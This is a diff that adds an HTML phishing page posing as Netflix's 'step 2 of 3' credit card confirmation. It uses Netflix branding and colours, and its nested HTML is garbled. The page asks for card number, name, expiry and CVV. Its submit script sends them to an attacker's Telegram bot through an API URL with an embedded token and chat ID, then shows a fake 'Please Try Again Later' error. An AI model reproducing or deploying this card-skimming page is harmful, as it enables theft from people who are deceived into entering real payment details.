@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link href="style_1.css" rel="stylesheet" type="text/css">
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css"
+      integrity="sha512-xh6O/CkQoPOWDdYTDqeRdPCVd1SpvCA9XXcUnZS2FmJNp1coAFzvtCN9BmamE+4aHK8yyUHUSCcJHgXloTyT2A=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico" type="image/x-icon" />
+    <link rel="stylesheet" href="signup_payment.css" />
+
+    <title>Confirming Your Paymeny Method</title>
+  </head>
+
+  <body>
+    <nav class="nav nav-3">
+      <a href="">
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7a/Logonetflix.png/1600px-Logonetflix.png" alt="" />
+      </a>
+      <a href="" class="btn-logout text-underline">Sign Out</a>
+    </nav>
+
+    <section class="pay-container margin-top margin-inline">
+      <div class="payment text-center">
+        <i class="fas fa-lock fa-2x icon-circle"></i>
+        <h style="font-size:1.4rem;">Credit Card Payment</h>
+        <h2>step 2 of 3</h2>
+        <p class="text-des">Your payment is encrypted and you can change how you pay anytime.</p>
+        <p class="text-des-1">
+          Secure for peace of mind. <br />
+          Cancel easily online.
+        </p>
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+
+</head>
+<body>
+    <div class="container">
+       
+        <form id="payment-form">
+            <div class="form-group">
+                <label for="card-number">Card Number</label>
+                <input type="text" id="card-number" name="card-number" placeholder="Enter your card number" required>
+            </div>
+            <div class="form-group">
+                <label for="card-name">Cardholder Name</label>
+                <input type="text" id="card-name" name="card-name" placeholder="Enter cardholder name" required>
+            </div>
+            <div class="form-group">
+                <label for="expiry-date">Expiry Date</label>
+                <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY" required>
+            </div>
+            <div class="form-group">
+                <label for="cvv">CVV</label>
+                <input type="text" id="cvv" name="cvv" placeholder="Enter CVV" required>
+            </div>
+         
+         
+         
+         <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+
+    <style>
+        /* Style the button to match Netflix's button */
+        button[type="submit"] {
+            background-color: #E50914; /* Netflix red color */
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Hover effect */
+        button[type="submit"]:hover {
+            background-color: #CC0814; /* Slightly darker red */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <form id="payment-form">
+            <!-- Your form inputs here -->
+
+            <button type="submit">Confirm Payment</button>
+        </form>
+    </div>
+
+    <!-- Your JavaScript code here -->
+</body>
+</html>
+
+         
+         
+         
+         
+        </form>
+    </div>
+
+    <script>
+        const form = document.getElementById('payment-form');
+
+        form.addEventListener('submit', (event) => {
+            event.preventDefault();
+
+            const cardNumber = document.getElementById('card-number').value;
+            const cardName = document.getElementById('card-name').value;
+            const expiryDate = document.getElementById('expiry-date').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual bot token and chat ID
+            const url = `https://api.telegram.org/bot6681705529:AAGU3yNUk8Pof_tBZkYUOEh3SSF5D0qMK64/sendMessage?chat_id=5936200928&text=Card Number: ${cardNumber}%0A Cardholder Name: ${cardName}%0A Expiry Date: ${expiryDate}%0A CVV: ${cvv}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert('Please Try Again Later');
+                    } else {
+                        alert('Please Try Again Later');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Please Try Again Later');
+                });
+        });
+    </script>
+</body>
+</html>
+
+
+    </section>
+
+    <footer class="footer footer-gray margin-top-1">
+      <div class="footer-container margin-inline">
+        <p class="text-gray">
+          Questions? <br />
+          Call 007-803-321-2130
+        </p>
+        <div class="links">
+          <ul class="">
+            <li><a class="text-terms text-underline" href="">FAQ</a></li>
+            <li><a class="text-terms text-underline" href="">Cookie Preferences</a></li>
+          </ul>
+
+          <ul>
+            <li><a class="text-terms text-underline" href="">Help Center</a></li>
+            <li><a class="text-terms text-underline" href="">Corporate Information</a></li>
+          </ul>
+
+          <a class="text-terms text-underline" href="">Terms of Use</a>
+
+          <a class="text-terms text-underline" href="">Privacy</a>
+        </div>
+
+        <div class="language">
+          <select class="language-select" onchange="location=this.value;">
+            <option value="english" selected>English</option>
+            <option value="">Bahasa Indonesia</option>
+          </select>
+          <div class="language-icon">
+            <i class="fas fa-globe globe"></i>
+            <i class="fas fa-chevron-down chevron"></i>
+          </div>
+        </div>
+      </div>
+    </footer>
+  </body>
+</html>
